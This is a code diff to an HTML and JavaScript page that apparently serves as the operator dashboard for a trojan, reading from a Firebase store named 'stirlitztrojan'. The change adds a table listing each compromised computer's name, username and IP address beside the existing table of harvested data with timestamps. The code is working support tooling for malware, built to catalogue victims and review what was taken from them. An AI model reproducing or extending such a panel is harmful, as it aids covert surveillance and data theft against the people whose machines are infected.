@@ -40,7 +40,12 @@
     </style>
   </head>
   <body>
-    <h1>Data</h1>
+    <h1>Users:</h1>
+    <table id="userTable">
+      <tr><th>Computer</th><th>Username</th><th>IP</th></tr>
+      <tr class="line"><th colspan="3"></th></tr>
+    </table>
+    <h1>Data:</h1>
     <table id="dataTable">
       <tr><th>Computer</th><th>Username</th><th>Data</th><th>Time</th><th>Date</th></tr>
       <tr class="line"><th colspan="5"></th></tr>
@@ -49,9 +54,31 @@
     <script>
     <!--
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/");
+    var rows, color;
     firebase.once("value", function(snapshot) {
-      var rows = snapshot.child("data");
-      var color = "#cccccc";
+      rows = snapshot.child("user");
+      color = "#cccccc";
+      rows.forEach(function(row){
+        var computer = row.key().split(",")[0].split("&")[0];
+        var username = row.key().split(",")[0].split("&")[1];
+        var ip = row.key().split(",")[1];
+        // New row:
+        var tableRow = document.getElementById("userTable").insertRow(2);
+        tableRow.style.backgroundColor = color;
+        if(color == "#cccccc") color = "#aaaaaa";
+        else color = "#cccccc";
+        var tableCellComputer = tableRow.insertCell(0);
+        tableCellComputer.className = "nowrapword";
+        tableCellComputer.innerHTML = computer;
+        var tableCellUsername = tableRow.insertCell(1);
+        tableCellUsername.className = "nowrapword";
+        tableCellUsername.innerHTML = username;
+        var tableCellIp = tableRow.insertCell(2);
+        tableCellIp.className = "nowrapword";
+        tableCellIp.innerHTML = ip;
+      });
+      rows = snapshot.child("data");
+      color = "#cccccc";
       rows.forEach(function(row){
         var computer = row.key().split(",")[0].split("&")[0];
         var username = row.key().split(",")[0].split("&")[1];
